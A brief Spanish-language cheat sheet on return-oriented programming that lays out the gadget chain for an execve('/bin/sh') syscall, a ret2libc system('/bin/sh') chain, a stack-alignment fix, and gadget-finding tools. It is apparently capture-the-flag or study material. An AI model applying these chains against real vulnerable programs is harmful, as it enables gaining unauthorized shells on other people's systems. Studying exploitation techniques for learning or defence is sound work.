# ROP / ret2syscall (cheat sheet)

Con NX no puedes ejecutar shellcode en la pila; encadenas "gadgets" (secuencias que acaban en
`ret`) para llamar funciones o syscalls.

## execve('/bin/sh',0,0) por syscall (binarios estaticos)
Necesitas: `pop rdi;ret`, `pop rsi;ret`, `pop rdx;ret` (o `pop rdx;pop rbx;ret`),
`pop rax;ret`, `syscall`. Y la cadena "/bin/sh" (en el binario o escribirla en .bss).
```
pop rax; 0x3b        # SYS_execve
pop rdi; &"/bin/sh"
pop rsi; 0
pop rdx; 0
syscall
```
Evita SROP (sigreturn) si puedes: usa registros explicitos; SROP es fragil.

## ret2libc system('/bin/sh')
`pop rdi; ret` + p64(binsh) + p64(ret_align) + p64(system). Necesita libc base (leak).

## Alineacion
Anade un `ret` extra si movaps crashea (rsp%16==0 en la llamada a libc).

## Herramientas
ROPgadget / ropper para listar gadgets; pwntools `ROP(elf)`; `one_gadget libc.so.6` para un
solo gadget que da shell (con constraints de registros/stack).
